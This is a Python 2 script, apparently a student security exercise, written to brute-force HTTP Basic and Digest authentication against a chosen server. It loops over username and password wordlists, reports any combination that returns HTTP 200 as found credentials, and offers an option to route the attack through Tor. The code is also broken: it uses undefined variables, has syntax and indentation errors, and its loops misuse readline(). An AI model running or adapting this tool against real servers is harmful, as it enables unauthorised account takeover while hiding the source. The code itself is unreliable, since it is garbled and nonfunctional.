#!/usr/bin/python
# -*- coding: utf-8 -*-
#Becerra Alvarado Hugo Alonso y Cabrera Balderas Carlos Eduardo
#UNAM-CERT
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError
from requests.auth import HTTPDigestAuth
import socks
import socket

#Cambiar el agente de usuario opcion 2

import httplib
httplib.HTTPConnection.debuglevel = 1                             
import urllib2

opener = urllib2.build_opener(proxy)
opener.addheaders = {'User-agent':'CabreraBecerra'}
urllib2.install_opener(opener)

request = urllib2.Request(url, headers={'User-agent':'CabreraBecerra'})

request.headers['User-agent'] = 'CabreraBecerra'

request.add_header('User-agent', 'CabreraBecerra')
#Fin del agente de usuario

def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-T', '--tor', dest='tor', default=None, action="store_true", help='Se realiza desde tor el ataque') #Se agrega la bandera de Tor -T, para realizar las peticiones a través de este.
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def reportResults():
    pass


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url

def tor(options):
        if options.tor != none:
                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1",9050)
                socket.socket = socks.socksocket
                else:
                        print "sin tor"

def makeRequest(host, user, password):
    #try:
        with open(lista, 'r') as user, open(contra, 'r') as password:
            listaUsu = user.readline()
            listPass = password.readline()
            for u in listaUsu:
                u = u[:-1:]
                for p in listaPass:
                    p = p[:-1:]

                    try:
                        response = get(host, auth=(u,p))

	if response.status_code == 200:
	    print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (u,p)
	else:
	    print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

def makeRequestDigest(host, user, password):

    with open(lista, 'r') as user, open(contra, 'r') as password:
            listaUsu = user.readline()
            listPass = password.readline()
            for u in listaUsu:
                u = u[:-1:]
                for p in listaPass:
                    p = p[:-1:]

    try:
        response = get(host, auth=HTTPDigestAuth(user,password))
        if response.status_code == 200:
            print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
        else:
            print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        makeRequest(url, opts.user, opts.password)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
